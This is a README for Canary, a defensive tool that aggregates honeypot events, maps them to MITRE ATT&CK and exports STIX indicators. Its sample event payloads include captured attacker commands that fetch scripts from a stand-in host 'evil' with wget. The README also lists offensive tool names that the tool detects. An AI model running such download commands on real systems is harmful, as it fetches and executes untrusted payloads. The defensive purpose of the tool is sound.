<p align="center">
  <h1 align="center">Canary</h1>
  <p align="center">HoneyNet — Centralized Honeypot Aggregation &amp; MITRE ATT&amp;CK Threat Correlation Platform</p>
</p>

<p align="center">
  <a href="https://github.com/s1d9e/canary/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/s1d9e/canary/ci.yml?branch=main&label=CI&style=flat-square" alt="CI status"></a>
  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/Python-3.10%2B-3776ab?style=flat-square" alt="Python 3.10+"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-0aa97a?style=flat-square" alt="MIT License"></a>
  <a href="https://github.com/s1d9e/canary/releases"><img src="https://img.shields.io/badge/Version-0.1.0-ff5d5d?style=flat-square" alt="v0.1.0"></a>
  <a href="https://github.com/s1d9e/canary/blob/main/SECURITY.md"><img src="https://img.shields.io/badge/Security-responsible%20disclosure-2f81f7?style=flat-square" alt="Security"></a>
  <a href="https://github.com/s1d9e/canary"><img src="https://img.shields.io/github/languages/top/s1d9e/canary?style=flat-square&color=ffab00" alt="Language"></a>
</p>

---

**Canary** is a defensive, blue-team platform that fuses the telemetry of all your
honeypots into one consistent threat-intelligence view. It normalizes heterogeneous
events, maps them to **MITRE ATT&CK**, correlates the same attacker across services
and honeypots, scores the risk, and produces ready-to-use **IOC / STIX 2.1** outputs.

It is a **passive aggregation layer**: Canary never scans, never connects, never
attacks. It only analyzes traffic that was already directed at *your own* deceptions.

## Why Canary?

You deploy several isolated honeypots — `blood-web`, `voltron-ssh`, `Backrooms`,
`Cowrie`. Great. But each writes its **own log format** into its **own database**:

```
blood-web/events.log      voltron-ssh/journal.db      cowrie/cowrie.json
     │                        │                            │
     └────────────────────────┼────────────────────────────┘
                              ▼
                        CANARY (this project)
                              │
          ┌───────────────────┼─────────────────────┐
          │                   │                     │
   normalized events     ATT&CK techniques      attacker profiles
   + unified API         + tool fingerprinting   + risk scores
                              │
                      ┌───────┴───────┐
                      ▼               ▼
                STIX 2.1 / CSV    web · TUI · CLI
```

Without Canary, the same attacker scanning your SSH honeypot *and* your web honeypot
is two disconnected log lines. With Canary, it becomes **one tracked attacker** with
a full campaign trail.

## Features

| Area | Capability |
|------|------------|
| **Ingestion** | Unified REST API (`POST /api/v1/events`) + fingerprint-native parsers for blood-web, voltron-ssh, Backrooms, Cowrie (JSON &amp; HPFEEDS) and any custom honeypot |
| **Normalization** | Strict Pydantic schema; unknown / malicious payloads are stored as `raw` and never executed or rendered unsafely |
| **MITRE ATT&CK** | 25 built-in technique rules across all 14 tactics (brute force, C2, exfiltration, impact…) with per-event confidence |
| **Correlation** | Cross-honeypot session reconstruction by source identity — one attacker = one profile, one score |
| **Fingerprinting** | Detects tooling from UA + command signatures: nuclei, sqlmap, nmap, hydra, mimikatz, metasploit, python-requests… |
| **Risk scoring** | Progressive per-event scoring (auth failures, commands, techniques, tools, protocol/honeypot breadth) |
| **Interfaces** | Wireshark-style web dashboard, live Rich TUI, and full Typer CLI |
| **Threat intel** | STIX 2.1 bundle &amp; CSV export of indicators |
| **Security** | Optional `X-API-Token` auth on ingestion, escaped rendering, `LEGAL.md` + `SECURITY.md` |
| **Quality** | Type-checked (mypy), linted (ruff), 34+ tests, CI on Python 3.10–3.12 |

## Install

### From PyPI-like install (editable)

```bash
git clone https://github.com/s1d9e/canary.git
cd canary
pip install -e .
```

### Docker

```bash
docker build -t canary:latest .
docker run -p 8080:8080 -v `pwd`/canary.db:/app/canary.db canary:latest serve
```

## Quickstart

```bash
# 1. Initialize configuration + SQLite database
canary init

# 2. Start the ingestion API (http://127.0.0.1:8080/)
canary serve

# 3. In another terminal: start the dashboard (http://127.0.0.1:5000/)
canary web

# 4. Feed events — from a file or inline JSON
canary ingest ./event.json
canary ingest '{"honeypot":"cowrie","event_type":"command","src_ip":"203.0.113.7"}'

# 5. Explore
canary top --limit 10     # top attackers by risk score
canary profile 203.0.113.7
canary tui                # live terminal dashboard
canary export stix
```

## Connecting your honeypots

Every honeypot posts JSON to `POST /api/v1/events`. Canonical payload:

```json
{
  "honeypot": "voltron-ssh",
  "event_type": "auth",
  "protocol": "ssh",
  "src_ip": "203.0.113.7",
  "src_port": 51234,
  "dst_ip": "10.0.0.5",
  "dst_port": 22,
  "timestamp": "2026-09-07T12:34:56Z",
  "session_id": "b3f1…",
  "username": "root",
  "password": "toor",
  "command": "wget http://evil/exploit.sh",
  "raw": "login attempt root:toor"
}
```

Native formats are also accepted — Canary auto-detects the source:

| Honeypot | Format auto-detected | Example |
|---|---|---|
| **Cowrie** | raw JSON log / HPFEEDS | `{"eventid":"cowrie.command.input","src_ip":"192.0.2.9", …}` |
| **blood-web** | canonical JSON | `{"honeypot":"blood-web","protocol":"ssh", …}` |
| **voltron-ssh** | canonical JSON | `{"honeypot":"voltron-ssh","event_type":"command", …}` |
| **Backrooms** | canonical JSON | `{"honeypot":"backrooms","protocol":"smb", …}` |
| **Custom** | any mapping in a normalizer | extend `canary/ingest/normalizer.py` |

Webhook forwarding for your honeypots is a one-liner, e.g. with `curl`:

```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/events \
  -H "Content-Type: application/json" \
  -d '{"honeypot":"blood-web","protocol":"http","src_ip":"198.51.100.23",\
       "url":"/shell.php","user_agent":"python-requests/2.31",\
       "raw":"wget http://evil/sh.sh -O /tmp/sh.sh"}' \
  -H "X-API-Token: your-token"   # only if you started `canary serve --token`
```

## API reference

| Endpoint | Method | Description |
|---|---|---|
| `/api/v1/events` | `POST` | Ingest a honeypot event (201 on accepted) |
| `/api/v1/health` | `GET` | Liveness probe |
| `/api/events` | `GET` | Up to 200 most recent events (web frontend) |
| `/api/attackers` | `GET` | Top attackers by risk score |
| `/api/attacker/<key>` | `GET` | Full attacker profile |
| `/api/stats` | `GET` | Global counters |
| `/api/export/stix` | `GET` | STIX 2.1 bundle of all indicators |

## CLI reference

| Command | Description |
|---|---|
| `canary init` | Write default config + create the database |
| `canary serve [--host --port --token]` | Ingestion API (aiohttp) |
| `canary web [--host --port]` | Flask dashboard |
| `canary tui [--refresh]` | Live Rich TUI |
| `canary ingest <path-or-json>` | Ingest one event |
| `canary top [--limit]` | Top attackers |
| `canary profile <key>` | Full attacker + ATT&amp;CK coverage |
| `canary export <stix\|csv> [--name]` | Export IOCs |

## Configuration

`~/.canary/config.yaml` (created by `canary init`):

```yaml
server:
  host: 127.0.0.1
  port: 8080
  api_token: null

db:
  path: canary.db
  echo: false

correlation:
  score_initial: 10
  score_auth_failure: 5
  score_command: 8
  score_technique: 15
  score_new_honeypot: 7
  score_protocol: 3
  score_tool: 12
```

## Project structure

```
canary/
├── canary/
│   ├── cli/          # Typer CLI + Rich TUI
│   ├── core/         # Pydantic models, async SQLite, YAML config
│   ├── ingest/       # aiohttp API, normalizers, pipeline
│   ├── correlate/    # correlation engine, scoring, fingerprinting
│   ├── attack/       # MITRE ATT&CK matrix + technique rules
│   ├── export/       # STIX 2.1 + CSV exporters
│   └── web/          # Flask dashboard + Wireshark-style frontend
├── tests/            # pytest suite (normalizer, attack, correlation, API, export)
├── .github/workflows/ci.yml
├── pyproject.toml
├── Makefile
└── Dockerfile
```

## Development

```bash
make dev          # pip install -e ".[dev]"
make test         # pytest
make test-cov     # pytest with coverage
make lint         # ruff check
make format       # ruff format
make typecheck    # mypy
make docker       # build image
```

CI (GitHub Actions) runs **lint + typecheck** and tests across **Python 3.10/3.11/3.12**.

## Roadmap

- [ ] Fleet orchestrator: deploy &amp; manage decoy containers (Backrooms-style) from Canary
- [ ] Attacker clustering (signature-based / ML)
- [ ] MITRE ATT&amp;CK Navigator export
- [ ] Replay integration with `chronos` / `helix` for detection validation
- [ ] Multi-node aggregation (agent → central)

## Security &amp; etiquette

Canary is a **passive, defensive** tool. It does not initiate connections or attacks.
Deploy it on your own infrastructure, in your lab, or on assets you own — **never**
point deception infrastructure at third parties. See [LEGAL.md](LEGAL.md) and
[SECURITY.md](SECURITY.md).

## License

[MIT](LICENSE) © **s1d9e**

---

<p align="center">
  Made with <span style="color: #ff0040;">&#9829;</span> by <b>s1d9e</b> &nbsp;·&nbsp;
  <a href="https://github.com/s1d9e/canary/issues">Issues</a> &nbsp;·&nbsp;
  <a href="https://github.com/s1d9e/canary/discussions">Discussions</a>
</p>